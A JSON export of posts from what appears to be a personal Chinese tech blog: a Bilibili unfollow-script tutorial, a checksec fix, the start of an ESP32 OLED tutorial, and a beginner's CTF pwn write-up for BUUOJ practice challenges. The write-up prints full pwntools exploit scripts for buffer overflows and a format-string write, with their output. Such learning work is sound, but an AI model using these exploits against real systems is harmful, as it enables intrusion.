[{"content":"工具名称： bili-follow-cleaner（B站关注清理器）\n功能说明： 自动扫描B站关注列表，批量取关超过设定天数未发动态的用户\n仓库地址： https://github.com/wuko233/bili-follow-cleaner\n2025年8月18日\n更新了release，现在windows用户可以直接下载已经编译好的程序直接运行：\n下载脚本程序 → 🔰 第一步：安装Python环境（5分钟） 这是运行脚本的基础，就像手机需要操作系统才能运行APP\nWindows用户\n访问Python官网 点击黄色按钮下载 Python 3.9+ 版本 安装时务必勾选 Add Python to PATH（重要！） 完成安装后，按 Win+R 输入 cmd 打开黑窗口 输入 python --version 出现版本号即成功 Mac用户\n打开终端（应用程序→实用工具→终端） 粘贴安装命令： 1 2 /bin/bash -c \u0026#34;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\u0026#34; brew install python@3.10 Linux用户\n都用Linux了，不会的话罚你装十遍archOvO\n📥 第二步：获取脚本文件（2分钟） 下载脚本压缩包 → 点我下载（github） 点我下载（cf镜像，内地推荐） 解压后得到文件夹（建议放在桌面方便查找） 记住文件夹路径（如 C:\\Users\\你的名字\\Desktop\\bili-follow-cleaner） ⚙ 第三步：安装必要组件（3分钟） 打开命令提示符（Windows）或终端（Mac）\n输入安装命令（逐行执行）：\n1 2 3 4 5 # 安装基础组件 pip install httpx requests # 安装B站API库 pip install bilibili-api 🚀 第四步：运行脚本（首次需登录） 在脚本文件夹空白处 按住Shift+右键 → 选择\u0026quot;在此处打开命令窗口\u0026quot; 输入启动命令： 1 python main.py 扫码登录流程： 终端会出现二维码 → 用B站APP扫码 登录成功后自动保存凭证（生成 cookies.json 文件） 下次运行无需重复登录 ⚡ 第五步：参数设置指南（关键步骤） 运行后会出现配置菜单，按提示操作：\n1 2 3 4 5 6 1. 每页爬取数量 → 默认50（直接回车） 2. 白名单用户 → 输入要保护的UID（如喜欢的UP主） 3. 不活跃阈值 → 输入天数（365=1年未更新） 4. 跳过最近关注 → 输入数字（保护新关注的UP主） 5. 移除无动态用户 → 输入 `n` 6. 请求延迟 → 默认5-20秒（直接回车） 💡 示例：想清理2年未更新的用户，在\u0026quot;不活跃阈值\u0026quot;输入 730\n✅ 第六步：执行清理 确认参数后开始运行 脚本会自动： 扫描所有关注用户 检查最后发动态时间 跳过白名单和互关用户 记录日志到 unfollow.log 完成后显示统计结果： 1 2 3 共扫描328个关注 取关成功47个，失败0个！ 总耗时：0:12:45 ⚠ 重要注意事项 安全提示\n不要分享 cookies.json 文件（包含登录凭证） 首次使用建议设置高阈值（如365天）测试 风控规避\n单次清理建议不超过100人 遇到错误代码 -352 需增大延迟参数 数据恢复\n误删用户可对照日志，通过B站官网手动重新关注：\n1 空间主页 → 关注 → 全部关注 → 查找用户 💻 进阶技巧（非必须） 操作 方法 修改白名单 用记事本打开 main.py → 搜索 ignore_list → 添加UID 重新登录 删除文件夹里的 cookies.json 重新运行 查看日志 打开同目录下的 unfollow.log 文件 ✨ 脚本优势：自动跳过互关用户/特别关注，避免误删亲友账号\n免责声明： 本工具为开源项目，仅供学习交流，过度使用可能导致账号异常，请遵守B站用户协议。清理前建议导出关注列表备份。\n后面打算做个js版的\u0026hellip;先挖个坑。\n好用！觉得好用可以给我一个star吗qwq：仓库\n欢迎大佬指点或pr，代码水平不够QAQ\n遇到问题？欢迎在评论区留言！\n","date":"2025-08-10T00:00:00Z","permalink":"https://blog.wuko.top/posts/2025/08/10/bili-follow-cleaner.html/","title":"超详细教程：B站批量取关不活跃用户脚本"},{"content":"问题发现 在学pwn使用checksec时发现了一个问题：\n别人的是竖着的，而且有arch：\n1 2 3 4 5 6 7 [*] \u0026#39;/home/wuko233/Projects/pwn/pwn1_sctf_2016/pwn1_sctf_2016\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) Stripped: No 但是我的是：\n1 2 RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILE Partial RELRO No canary found NX enabled No PIE No RPATH No RUNPATH 73 Symbols No 0 1 /home/wuko233/Desktop/pwn/ 又不易读又看不到架构信息，导致我每次都得专门在IDA里看一次程序的架构信息，太麻烦了。\n后来上网搜了下，其实是安装的版本问题：\n问题原因：两个不同的checksec 我是直接执行了:\n1 sudo apt install checksec 直接从系统包安装了checksec\n实际应该是安装pwntool中的checksec\n解决方案：安装pwntools的checksec 推荐方法：使用pipx 因为实体机用的Debian，装pip会PEP 668报错，，，kali好像也会，所以推荐用pipx安装：\n1 2 3 4 5 6 7 8 9 10 11 12 # 安装pipx sudo apt install pipx pipx ensurepath # 安装pwntools pipx install pwntools # 刷新环境变量 source ~/.bashrc # 或source ~/.zshrc # 使用pwntools的checksec pwn checksec \u0026lt;your_binary\u0026gt; 替代方法：创建虚拟环境 python的虚拟环境= = ，难评\u0026hellip;\n1 2 3 4 5 6 7 8 9 # 创建虚拟环境 python3 -m venv pwn-env source pwn-env/bin/activate # 安装pwntools pip install pwntools # 使用checksec pwn checksec \u0026lt;your_binary\u0026gt; 装完之后，用checksec是调用系统包里的checksec（没arch），用pwn checksec是使用的pwntools里的checksec，可以看到架构。\n现在就可以：\n乐\n","date":"2025-06-11T00:00:00Z","image":"https://blog.wuko.top/posts/2025/06/11/checksecinstalldiff.html/cover_hu_fd3c431590a970b7.jpg","permalink":"https://blog.wuko.top/posts/2025/06/11/checksecinstalldiff.html/","title":"checksec横表格不显示架构(arch)问题解决（不同版本安装）"},{"content":"初学者。。用于记录学习过程与笔记。\ntest_your_nc 先用checksec检查下：\nRELRO\nPartial → GOT 表可写（易被 GOT overwrite 攻击）。Full 时 GOT 只读更安全。\nSTACK CANARY\n未启用 → 栈溢出无检测，可直接覆盖返回地址。启用后栈破坏会崩溃。\nNX\n开启 → 栈/堆不可执行。\nPIE\n开启 → 代码地址随机化，需泄露地址。关闭则地址固定。\nRPATH/RUNPATH\n未设置 → 无额外库路径，降低劫持风险。\nSymbols\n64 → 保留符号（函数名等），易逆向分析。\nFORTIFY\n未启用 → 无堆栈保护。\n再拖到IDA Pro里看看:\n1 2 3 4 5 int __fastcall main(int argc, const char **argv, const char **envp) { system(\u0026#34;/bin/sh\u0026#34;); return 0; } 直接调用system()函数进入shell，所以直接使用netcat连接靶机：\n1 nc ip port 发现直接连接上了，根目录就有flag，得到：flag{b6588539-d35f-4fde-b2b9-8c56d7fb66bd}\nrip checksec分析：\n1 2 3 ❯ checksec --file=./pwn1 RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILE Partial RELRO No canary found NX disabled No PIE No RPATH No RUNPATH 64 Symbols No 0 1 ./pwn1 IDA Pro分析主函数：\n1 2 3 4 5 6 7 8 9 10 11 int __fastcall main(int argc, const char **argv, const char **envp) { char s[15]; // [rsp+1h] [rbp-Fh] BYREF puts(\u0026#34;please input\u0026#34;); gets(s, argv); puts(s); puts(\u0026#34;ok,bye!!!\u0026#34;); return 0; } 同时注意到fun()函数：\n1 2 3 4 int fun() { return system(\u0026#34;/bin/sh\u0026#34;); } gets()函数不检查输入长度，所以可利用其来溢出s，到达shellcode也就是fun()。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 .text:0000000000401186 .text:0000000000401186 ; Attributes: bp-based frame .text:0000000000401186 .text:0000000000401186 ; int fun() .text:0000000000401186 public fun .text:0000000000401186 fun proc near .text:0000000000401186 ; __unwind { .text:0000000000401186 push rbp .text:0000000000401187 mov rbp, rsp .text:000000000040118A lea rdi, command ; \u0026#34;/bin/sh\u0026#34; .text:0000000000401191 call _system .text:0000000000401196 nop .text:0000000000401197 pop rbp .text:0000000000401198 retn .text:0000000000401198 ; } // starts at 401186 .text:0000000000401198 fun endp 注意到shellcode位于40118A，所以我们要让其执行这个地址的命令。\n那么如何溢出呢？首先要填满s[15]，也就是15个字节，与此同时，还需要添加8个字节来顶掉基指针寄存器rbp;：\nrbp (Base Pointer Register) 是x86-64架构中的基指针寄存器,用于标记当前函数栈帧的起始位置 每个函数调用都会在栈上保存前一个函数的RBP值 , 这个保存操作占用固定的8字节空间, 在缓冲区溢出攻击中，这8字节是覆盖返回地址前必须越过的最后一个屏障, x86架构是4字节，x64架构是8字节 → 这是64位系统的关键特征\n所以构建payload：\n1 payload = b\u0026#39;q\u0026#39;*23 + p64(0x40118A) 先发送23个q使其溢出，后面接上shellcodefun()中终端函数的地址，尝试进入shell。\np64() 是 Python 中 pwntools 库的核心函数，用于将整数转换为64位小端序字节序列。在 pwn 漏洞利用中，它用于精确构造内存地址格式的 payload。\n最终程序：\n1 2 3 4 5 6 7 8 from pwn import * host = \u0026#34;node5.buuoj.cn\u0026#34; port = 25983 sh = remote(host, port) payload = b\u0026#39;q\u0026#39;*23 + p64(0x40118A) sh.sendline(payload) sh.interactive() 详解：\n新建一个sh对象，用于连接靶机以及操作靶机；\nremote()函数：pwntools的核心函数，用于创建TCP连接 sendline()向靶机发送payload;\nsendline()：发送数据并在末尾自动添加 \\n（0x0A） 重要：因为原程序使用 gets() 函数，该函数以 \\n 或 EOF 为结束标志\ninteractive()：作用：在攻击成功后进入交互式shell\n发送内容：\n1 qqqqqqqqqqqqqqqqqqqqqqq + \\x8A\\x11\\x40\\x00\\x00\\x00\\x00\\x00 + \\n 执行，获取到了shell，获得flag：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 PS C:\\Users\\root\u0026gt; \u0026amp; \u0026#34;D:/Program Files/python/python.exe\u0026#34; d:/CTF/项目/BUU/pwn/rip/hack.py [x] Opening connection to node5.buuoj.cn on port 25983 [x] Opening connection to node5.buuoj.cn on port 25983: Trying 117.21.200.176 [+] Opening connection to node5.buuoj.cn on port 25983: Done [*] Switching to interactive mode ls bin boot dev etc flag home ... var cat flag flag{7f35d897-a5fd-4505-84a7-2990b740f2d9} warmup_csaw_2016 先checksec:\n1 2 3 ❯ checksec --file=\u0026#39;/home/wuko233/Desktop/pwn/warmup_csaw_2016/warmup_csaw_2016\u0026#39; RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILE Partial RELRO No canary found NX disabled No PIE No RPATH No RUNPATH No Symbols No 0 2 /home/wuko233/Desktop/pwn/warmup_csaw_2016/warmup_csaw_2016 分析程序：\n1 2 3 4 5 6 7 8 9 10 11 12 __int64 __fastcall main(int a1, char **a2, char **a3) { char s[64]; // [rsp+0h] [rbp-80h] BYREF char v5[64]; // [rsp+40h] [rbp-40h] BYREF write(1, \u0026#34;-Warm Up-\\n\u0026#34;, 0xAuLL); write(1, \u0026#34;WOW:\u0026#34;, 4uLL); sprintf(s, \u0026#34;%p\\n\u0026#34;, sub_40060D); write(1, s, 9uLL); write(1, \u0026#34;\u0026gt;\u0026#34;, 1uLL); return gets(v5); } 1 2 3 4 int sub_40060D() { return system(\u0026#34;cat flag.txt\u0026#34;); } 和上面一道题差不多，还是利用gets()溢出，64+8=72，shellcode是sub_40060D，地址就位于0x40060D。\n所以，payload就是：\n1 payload = b\u0026#39;q\u0026#39;*72 + p64(0x40060D) 完整：\n1 2 3 4 5 6 7 8 from pwn import * host = \u0026#34;node5.buuoj.cn\u0026#34; port = 29765 sh = remote(host, port) payload = b\u0026#39;q\u0026#39;*72 + p64(0x40060D) sh.sendline(payload) sh.interactive() 直接得到了flag：\n1 2 3 4 [*] Switching to interactive mode \u0026gt;flag{110426c9-307c-4a2e-b763-73e47ca4a4fb} timeout: the monitored command dumped core [*] Got EOF while reading in interactive 不过这道题其实应该不是这样做的。。因为主函数里sprintf(s, \u0026quot;%p\\n\u0026quot;, sub_40060D)是用来打印出shellcode函数地址的，也就是泄露地址，但是它的PIE未启用，也就是每次的地址都是固定的，这个语句就毫无意义了。\n所以应该是这样的：\nPIE启用，每次运行时函数地址都是随机的，需要攻击者通过sprintf(s, \u0026quot;%p\\n\u0026quot;, sub_40060D)来获取shellcode函数地址，再通过gets()溢出进而执行shellcode。\n按照这个思路，再写一个脚本：\n1 2 3 4 5 6 7 8 9 10 11 12 from pwn import * host = \u0026#34;node5.buuoj.cn\u0026#34; port = 29765 sh = remote(host, port) print(sh.recvuntil(\u0026#34;WOW:\u0026#34;)) # 接收直到出现\u0026#34;WOW:\u0026#34; location = sh.recvline().strip().decode(\u0026#34;UTF-8\u0026#34;) #获取到字节串，转化为字符串并去除\\n print(\u0026#34;函数地址：\u0026#34; + location) payload = b\u0026#39;a\u0026#39;*72 + p64(int(location, 16)) #p64()需传入int，所以把地址字符串转换为16进制的int sh.sendline(payload) sh.interactive() 得到flag：\n1 2 3 4 5 6 7 8 9 10 d:\\CTF\\项目\\BUU\\pwn\\warmup_csaw_2016\\hack.py:7: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes print(sh.recvuntil(\u0026#34;WOW:\u0026#34;)) b\u0026#39;-Warm Up-\\nWOW:\u0026#39; 函数地址：0x40060d [*] Switching to interactive mode \u0026gt;flag{110426c9-307c-4a2e-b763-73e47ca4a4fb} timeout: the monitored command dumped core [*] Got EOF while reading in interactive [*] Interrupted [*] Closed connection to node5.buuoj.cn port 29765 ciscn_2019_n_1 （改值） 和上面一样：\n1 2 RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILE Partial RELRO No canary found NX enabled No PIE No RPATH No RUNPATH 73 Symbols No 0 1 /home/wuko233/Desktop/pwn/ main:\n1 2 3 4 5 6 7 int __fastcall main(int argc, const char **argv, const char **envp) { setvbuf(_bss_start, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 2, 0LL); func(); return 0; } func:\n1 2 3 4 5 6 7 8 9 10 11 12 13 int func() { char v1[44]; // [rsp+0h] [rbp-30h] BYREF float v2; // [rsp+2Ch] [rbp-4h] v2 = 0.0; puts(\u0026#34;Let\u0026#39;s guess the number.\u0026#34;); gets(v1); if ( v2 == 11.28125 ) return system(\u0026#34;cat /flag\u0026#34;); else return puts(\u0026#34;Its value should be 11.28125\u0026#34;); } 分析一下，shellcode必须满足v2值为11.28125，所以需要通过gets()溢出来改变v2的值。\n注意到：\n1 2 char v1[44]; // [rsp+0h] [rbp-30h] BYREF float v2; // [rsp+2Ch] [rbp-4h] 在v1的定义下就是v2，所以可以溢出v1来修改v2的值。\nv1长度为44，v2长度为4(float)。(byte)\n这里补个笔记，长度判断也可以靠后面反编译的注释：\nv1起始点：rbp-30h\nv2起始点：rbp-4h\n所以v1长度就是0x30(48)-0x4(4)=44\n溢出v1还是和上面一样：'q'*44\n接下来的主要问题是给v2赋值11.28125：\n肯定是不能直接传进这个数的，因为它是浮点，我们需要传入字节，所以可以用struct库：\nStruct 模块用于在字节字符串和 Python 原生数据类型之间进行转换。它可以将 Python 数据打包成二进制数据，或将二进制数据解包成 Python 数据。\nstruct.pack() 函数可以将数据打包成二进制格式。格式字符串指定了数据的类型和顺序。\n1 2 3 4 5 6 7 import struct num = 11.28125 num2byte = struct.pack(\u0026#34;f\u0026#34;, num) # float类型转byte print(f\u0026#34;{num} 转换结果：{num2byte}\u0026#34;) # 11.28125 转换结果：b\u0026#39;\\x00\\x804A\u0026#39; 综上可得payload:\n1 2 3 4 num = 11.28125 num2byte = struct.pack(\u0026#34;f\u0026#34;, num) print(f\u0026#34;{num} 转换结果：{num2byte}\u0026#34;) payload = b\u0026#39;q\u0026#39;*44 + num2byte 总体：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 from pwn import * import struct host = \u0026#34;node5.buuoj.cn\u0026#34; port = 25333 sh = remote(host, port) num = 11.28125 num2byte = struct.pack(\u0026#34;f\u0026#34;, num) print(f\u0026#34;{num} 转换结果：{num2byte}\u0026#34;) payload = b\u0026#39;q\u0026#39;*44 + num2byte print(sh.recvuntil(\u0026#34;Let\u0026#39;s guess the number.\u0026#34;)) sh.sendline(payload) sh.interactive() 拿到flag：\n1 2 3 4 5 b\u0026#34;Let\u0026#39;s guess the number.\u0026#34; [*] Switching to interactive mode flag{3214184b-a04b-419e-b114-52e08022514e} [*] Got EOF while reading in interactive 主包主包，float转byte还是太麻烦，有没有更简单粗暴一点的方法？有的兄弟，有的：\n1 2 3 gets(v1); if ( v2 == 11.28125 ) return system(\u0026#34;cat /flag\u0026#34;); 既然你源码里有system(\u0026quot;cat /flag\u0026quot;)，那我们可不可以直接覆盖到这个shellcode的地址，直接执行shellcode？答案是肯定的！\n先来查查shellcode地址：\n1 .text:00000000004006BE mov edi, offset command ; \u0026#34;cat /flag\u0026#34; 得到地址：0x4006BE；\n已知v1长44，v2长4，旧rbp长8，那我问你，需要顶掉多少byte？没错，也就是44+4+8=56！\n再来构建payload:\n1 payload = b\u0026#39;q\u0026#39;*56 + p64(0x4006BE) EZ，拿到了！\n1 2 3 4 5 6 7 b\u0026#34;Let\u0026#39;s guess the number.\u0026#34; [*] Switching to interactive mode Its value should be 11.28125 flag{47e47e55-73c9-4c29-98cc-8e3e879669ec} timeout: the monitored command dumped core [*] Got EOF while reading in interactive 完整脚本：\n1 2 3 4 5 6 7 8 9 10 11 from pwn import * host = \u0026#34;node5.buuoj.cn\u0026#34; port = 26748 sh = remote(host, port) payload = b\u0026#39;q\u0026#39;*56 + p64(0x4006BE) print(sh.recvuntil(\u0026#34;Let\u0026#39;s guess the number.\u0026#34;)) sh.sendline(payload) sh.interactive() pwn1_sctf_2016 (fgets()) 1 2 3 4 5 6 7 [*] \u0026#39;/home/wuko233/Projects/pwn/pwn1_sctf_2016/pwn1_sctf_2016\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) Stripped: No 32位\nmain\n1 2 3 4 5 int __cdecl main(int argc, const char **argv, const char **envp) { vuln(); return 0; } vuln\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 int vuln() { const char *v0; // eax char s[32]; // [esp+1Ch] [ebp-3Ch] BYREF char v3[4]; // [esp+3Ch] [ebp-1Ch] BYREF char v4[7]; // [esp+40h] [ebp-18h] BYREF char v5; // [esp+47h] [ebp-11h] BYREF char v6[7]; // [esp+48h] [ebp-10h] BYREF char v7[5]; // [esp+4Fh] [ebp-9h] BYREF printf(\u0026#34;Tell me something about yourself: \u0026#34;); fgets(s, 32, edata); std::string::operator=(\u0026amp;input, s); std::allocator\u0026lt;char\u0026gt;::allocator(\u0026amp;v5); std::string::string(v4, \u0026#34;you\u0026#34;, \u0026amp;v5); std::allocator\u0026lt;char\u0026gt;::allocator(v7); std::string::string(v6, \u0026#34;I\u0026#34;, v7); replace((std::string *)v3); std::string::operator=(\u0026amp;input, v3, v6, v4); std::string::~string(v3); std::string::~string(v6); std::allocator\u0026lt;char\u0026gt;::~allocator(v7); std::string::~string(v4); std::allocator\u0026lt;char\u0026gt;::~allocator(\u0026amp;v5); v0 = (const char *)std::string::c_str((std::string *)\u0026amp;input); strcpy(s, v0); return printf(\u0026#34;So, %s\\n\u0026#34;, s); } (cpp反编译真难看。。)\n注意到其中定义v4、v6分别为you、I，同时在replace函数中被调用（v3），所以猜测应该是替换input内容中的I为you。\nfgets()内容缓冲区长度为32；s位于3C（esp+1Ch ebp-3Ch），也就是3*16+12=60字节长度；32位程序（Arch:i386-32-little），所以返回地址长度是4；\n需要通过溢出fgets()来覆盖s和返回地址，但是fgets()缓冲区只有32，我们却需要60+4=64，该怎么办呢？\n这时就可以利用replace()了！一个I1长度换3长度的you，我们最多就可以得到32*3=109的长度了！但我们只需要64长度，64/3=21余1:。\n所以先构建payload的一部分：\n1 payload = b\u0026#39;I\u0026#39; * 21 + b\u0026#39;q\u0026#39; 这样就实现了覆盖s与返回地址了，接下来就差shellcode了：\nget_flag\n1 2 3 4 int get_flag() { return system(\u0026#34;cat flag.txt\u0026#34;); } 1 2 3 4 5 6 7 8 9 10 11 12 13 .text:08048F0D ; int get_flag() .text:08048F0D public get_flag .text:08048F0D get_flag proc near .text:08048F0D ; __unwind { .text:08048F0D push ebp .text:08048F0E mov ebp, esp .text:08048F10 sub esp, 18h .text:08048F13 mov dword ptr [esp], offset command ; \u0026#34;cat flag.txt\u0026#34; .text:08048F1A call _system .text:08048F1F leave .text:08048F20 retn .text:08048F20 ; } // starts at 8048F0D .text:08048F20 get_flag endp 注意到shellcode地址为8048F13，所以构建后半部分shellcode:\n1 payload += p32(0x8048F13) 得到最终脚本：\n1 2 3 4 5 6 7 8 9 10 11 from pwn import * host = \u0026#34;node5.buuoj.cn\u0026#34; port = 29992 sh = remote(host, port) payload = b\u0026#39;I\u0026#39; * 21 + b\u0026#39;q\u0026#39; payload += p32(0x8048F13) sh.sendline(payload) sh.interactive() 拿下！\n1 2 3 4 5 6 7 8 PS D:\\B23\\VSC\\H5\\koishi.521514.xyz\u0026gt; \u0026amp; \u0026#34;D:/Program Files/python/python.exe\u0026#34; d:/CTF/项目/BUU/pwn/pwn1_sctf_2016/hack.py [x] Opening connection to node5.buuoj.cn on port 29992 [x] Opening connection to node5.buuoj.cn on port 29992: Trying 117.21.200.176 [+] Opening connection to node5.buuoj.cn on port 29992: Done [*] Switching to interactive mode flag{87ce8c15-cb0e-4149-8980-f5ca1a9e1573} timeout: the monitored command dumped core [*] Got EOF while reading in interactive jarvisoj_level0 (read()) 1 2 3 4 5 6 7 [*] \u0026#39;/home/wuko233/Projects/pwn/jarvisoj_level0/level0\u0026#39; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Stripped: No 1 2 3 4 5 6 7 8 9 10 11 12 int __fastcall main(int argc, const char **argv, const char **envp) { write(1, \u0026#34;Hello, World\\n\u0026#34;, 0xDuLL); return vulnerable_function(1LL); } size_t vulnerable_function() { char buf[128]; // [rsp+0h] [rbp-80h] BYREF return read(0, buf, 0x200uLL); } 注意到read()函数，可以溢出，buf缓冲区大小为128，64位程序，所以返回地址长度8。\n构建前半部分payload:\n1 payload = b\u0026#39;q\u0026#39;*(128 + 8) 注意到shellcodecallsystem:\n1 2 3 4 5 6 7 8 9 10 11 12 .text:0000000000400596 ; int callsystem() .text:0000000000400596 public callsystem .text:0000000000400596 callsystem proc near .text:0000000000400596 ; __unwind { .text:0000000000400596 push rbp .text:0000000000400597 mov rbp, rsp .text:000000000040059A mov edi, offset command ; \u0026#34;/bin/sh\u0026#34; .text:000000000040059F call _system .text:00000000004005A4 pop rbp .text:00000000004005A5 retn .text:00000000004005A5 ; } // starts at 400596 .text:00000000004005A5 callsystem endp 地址为40059A，所以后半部分为：\n1 payload += p64(0x40059A) 完整：\n1 2 3 4 5 6 7 8 9 10 11 from pwn import * host = \u0026#34;node5.buuoj.cn\u0026#34; port = 25201 sh = remote(host, port) payload = b\u0026#39;q\u0026#39;*(128 + 8) payload += p64(0x40059A) sh.sendline(payload) sh.interactive() 拿下！\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 PS C:\\Users\\root\u0026gt; \u0026amp; \u0026#34;D:/Program Files/python/python.exe\u0026#34; //wsl.localhost/Debian/home/wuko233/Projects/pwn/jarvisoj_level0/hack.py [x] Opening connection to node5.buuoj.cn on port 25201 [x] Opening connection to node5.buuoj.cn on port 25201: Trying 117.21.200.176 [+] Opening connection to node5.buuoj.cn on port 25201: Done [*] Switching to interactive mode Hello, World ls bin boot dev etc flag flag.txt ... tmp usr var cat flag.txt flag{ab0c2d86-23b2-4460-b29f-a7d2975812d6} [第五空间2019 决赛]PWN5 (字符串格式化漏洞) 1 2 3 4 5 6 [*] \u0026#39;/home/wuko233/Projects/pwn/[第五空间2019 决赛]PWN5/pwn\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 注意到：\nRELRO: Partial RELRO\nStack: Canary found\n这很坏了，开启了栈保护（Canary），传统的栈溢出覆盖返回地址的方式会被检测到，导致程序终止。因此需要先泄露Canary值，或者寻找其他漏洞点。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 { unsigned int v1; // eax int result; // eax int fd; // [esp+0h] [ebp-84h] char nptr[16]; // [esp+4h] [ebp-80h] BYREF char buf[100]; // [esp+14h] [ebp-70h] BYREF unsigned int v6; // [esp+78h] [ebp-Ch] int *v7; // [esp+7Ch] [ebp-8h] v7 = \u0026amp;a1; v6 = __readgsdword(0x14u); setvbuf(stdout, 0, 2, 0); v1 = time(0); srand(v1); fd = open(\u0026#34;/dev/urandom\u0026#34;, 0); read(fd, \u0026amp;dword_804C044, 4u); printf(\u0026#34;your name:\u0026#34;); read(0, buf, 0x63u); printf(\u0026#34;Hello,\u0026#34;); printf(buf); printf(\u0026#34;your passwd:\u0026#34;); read(0, nptr, 0xFu); if ( atoi(nptr) == dword_804C044 ) { puts(\u0026#34;ok!!\u0026#34;); system(\u0026#34;/bin/sh\u0026#34;); } else { puts(\u0026#34;fail\u0026#34;); } result = 0; if ( __readgsdword(0x14u) != v6 ) sub_80493D0(); return result; } 注意到printf(buf);，直接输出用户输入内容，这里是一个字符串格式化漏洞：\nCTF Wiki - Format String\nPWN学习之格式化字符串及CTF常见利用手法\n当程序使用 printf(user_input) 时，如果用户输入包含格式化字符（如 %s, %x, %n），会触发以下风险：\n%s：读取任意地址数据\n%x：泄漏栈数据\n%n：向任意地址写入数据（写入已输出的字符数）\n用netcat连一下：\n1 nc node5.buuoj.cn 26814 输入AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p，获取printf栈上14个参数：\n| 返回地址 | 旧ebp | 格式化字符串指针 | [参数1] | [参数2] | \u0026hellip; |\n也就是输入的内容buf指针往后14个参数，得到：\n1 Hello,AAAA.0xff94c828.0x63.(nil).0xff94c84e.0x3.0xc2.0xf7de691b.0xff94c84e.0xff94c94c.0x41414141.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252eDR������your passwd: 注意到0x41414141出现在第10个，说明输入字符串的起始地址位于栈上指针后第10个参数的位置，因此可以使用 %10$ 系列格式化符来访问和操作这个位置。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 from pwn import * host = \u0026#34;node5.buuoj.cn\u0026#34; port = 29393 context.log_level = \u0026#39;debug\u0026#39; # p = process(\u0026#39;./pwn\u0026#39;) sh = remote(host, port) # rand_address_start = 0x804C044 payload = b\u0026#34;\u0026#34; payload += p32(0x804C044) payload += b\u0026#39;%10$n\u0026#39; sh.sendlineafter(\u0026#39;your name:\u0026#39;, payload) rec_data = sh.recvuntil(b\u0026#34;your passwd:\u0026#34;) sh.sendline(str(4)) sh.interactive() 32位，所以长度是4，原理就是：\n随机数生成在0x804C044，所以直接向这个地址写入，就可以覆盖这个随机数：\n1 2 3 payload += p32(0x804C044) payload += b\u0026#39;%10$n\u0026#39; # 向第10个位置写入4 然后发送4就得到flag了qwq\njarvisoj_level2 1 2 3 4 5 6 7 [*] \u0026#39;/home/wuko233/Projects/pwn/jarvisoj_level2/level2\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) Stripped: No 1 2 3 4 5 6 7 ssize_t vulnerable_function() { char buf[136]; // [esp+0h] [ebp-88h] BYREF system(\u0026#34;echo Input:\u0026#34;); return read(0, buf, 256u); } 读256，但是缓冲区只有136，同时居然还用着system()\u0026hellip;\n1 .plt:08048320 ; int system(const char *command) 和jarvisoj_level0一样，read()漏洞。\nshellcode在0804A024：\n1 .data:0804A024 hint db \u0026#39;/bin/sh\u0026#39;,0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 from pwn import * host = \u0026#34;node5.buuoj.cn\u0026#34; port = 26567 context.log_level = \u0026#39;debug\u0026#39; sh = remote(host, port) payload = b\u0026#39;q\u0026#39;*(136 + 4) payload += p32(0x8048320) # _system() payload += p32(0) payload += p32(0x804A024) # str: bin/sh sh.recvuntil(b\u0026#34;Input:\u0026#34;) sh.sendline(payload) sh.interactive() 利用system函数执行bin/sh，其中0是指定的system()的返回地址，因为要进shell，注定不会返回，所以可以瞎写一串数字，后接传入的参数。\n","date":"2025-05-21T00:00:00Z","image":"https://blog.wuko.top/posts/2025/05/21/pwnpwnpwn.html/cover_hu_1f93fa80424b2235.jpg","permalink":"https://blog.wuko.top/posts/2025/05/21/pwnpwnpwn.html/","title":"【CTF】pwn学习之路"},{"content":"前言 七毛九淘宝买了块0.96寸的1315驱动的OLED显示屏，到货焊接四根针脚：GND、VDD、SCK、SDA，由此得知这块屏幕走的是i2c协议。\n全网找了半天都没有在VSCode platformIO 里导入U8g2库的教程（也可能是我搜索的姿势不对），摸索了半天才点亮，所以写一篇教程方便和我一样不清楚的小白查阅。\n接线 GND - GND\nVCC - 3.3V/5V\nSCK(SCL) - 自定义口1\nSDA(MOSI) - 自定义口2\nU8g2库的安装 在VSCode\u0026gt;PlatformIO\u0026gt;PIO Home\u0026gt;Libraries中搜索U8g2:\n点击，添加至项目，等待漫长的安装\u0026hellip;(因为U8g2是一个兼容多平台的图像库，所以内容很多)\n安装好之后可以在你项目文件夹里的\n\\.pio\\libdeps\\esp32dev\\U8g2\n找到依赖和示例，至此和Arduino IDE里使用方法一致。\n注意，如果你先前还安装过Library里其他的屏幕驱动，需要把它删干净了再编译上传，不然可能会冲突报错= =。\n点亮 以我手中这块128x64单色OLED屏幕为例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 #include \u0026lt;Arduino.h\u0026gt; #include \u0026lt;U8g2lib.h\u0026gt; // 自定义的CLK和SDA引脚 #define OLED_CLK 12 #define 